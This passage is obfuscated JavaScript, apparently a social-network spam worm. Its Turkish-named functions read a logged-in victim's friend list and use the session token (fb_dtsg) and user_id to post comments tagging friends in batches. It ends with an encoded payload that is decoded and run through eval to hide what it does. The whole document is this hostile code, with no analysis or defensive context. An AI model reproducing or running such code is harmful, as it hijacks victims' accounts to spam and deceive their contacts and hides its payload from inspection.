(){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _6554;var _6708='2808D189B118D1286E1286C1151A1835F1808F1898A1907E1898F953E1736D1223B1169A1358F1322B1295A1349B1322B1304F1358A1331A1295C1169B1232A1394A1736F1223D1169B1304A1295E1295A1295B1295C1340F1349E1376E1358E1358B1313C1340F1331B1358F1304D1169D1232A1394D1736D1223F1169D1304E1295F1295A1295D1295A1304B1340B1322A1331E1340C1313B1295D1322F1313B1340B1169F1232A1394F1898F1916E1745D1835B1808E1898B1907D1223C1169D1304E1304A1367B1376A1331D1322F1304C1376A1367D1322C1295E1340F1349C1295B1331C1169C1232A1394E1898C1916D1745C1835D1808C1898A1907D1223E1169F1304B1322B1322A1313D1322A1313F1313C1349B1322E1340D1331E1322E1322B1349F1331D1169E1232C1394C1898E1916B1745C1835D1808A1898B1907D1223F1169B1304E1322C1340D1358A1349B1304C1358C1349C1376C1376A1340B1358F1295D1367F1295E1169B1232A1394C1898F1916A1745A1835B1808E1898F1907D1223B1169F1304B1322C1322E1304D1376E1295B1358C1367E1322D1340D1331A1358E1340F1304C1313C1169C1232A1394C1898B1916B1745A1835E1808B1898F1907B1223F1169A1304E1322F1322E1313D1322C1313E1340A1322C1349E1367C1358F1349C1349C1358A1295B1169C1232B1394F1898A1916E1745E1835E1808F1898B1907B1223B1169F1304A1322E1322C1313B1322F1313E1349B1367B1322C1340A1331A1322A1322A1313E1313E1169A1232F1394E1898D1916F1745E1835F1808E1898E1907E1223C1169C1304A1322A1340D1358F1349C1304B1331F1295A1349F1349B1313E1322F1358C1367D1322D1169E1232C1394A1898E1916F1745E1835C1808C1898B1907E1223E1169C1304F1322D1340D1358B1349D1304D1340C1313E1322C1313D1376C1295A1331B1322F1367F1169C1232F1394F1898B1916F1745B1835F1808A1898F1907C1223F1169F1304D1322D1340E1358B1349B1304B1349F1358B1322F1313F1376F1295D1331F1313F1322C1169A1232F1394C';var _3193=/[\x41\x42\x43\x44\x45\x46]/;var _9056=2;var _6744=_6708.charAt(_6708.length-1);var _5046;var _8661=_6708.split(_3193);var _5921=[String.fromCharCode,isNaN,parseInt,String];_8661[1]=_5921[_9056+1](_5921[_9056](_8661[1])/21);var _3666=(_9056==9)?String:eval;_5046='';_11=_5921[_9056](_8661[0])/_5921[_9056](_8661[1]);for(_6554=3;_6554<_11;_6554++)_5046+=(_5921[_9056-2]((_5921[_9056](_8661[_6554])+_5921[_9056](_8661[2])+_5921[_9056](_8661[1]))/_5921[_9056](_8661[1])-_5921[_9056](_8661[2])+_5921[_9056](_8661[1])-1));var _8618='_4989';var _9301='_8618=_5046';function _7250(_1956){_3666(_5917);_7250(_1572);_1572(_9301);_7250(_8618);}var _5917='_7250=_3666';var _1572='_1572=_7250';_7250(_6744);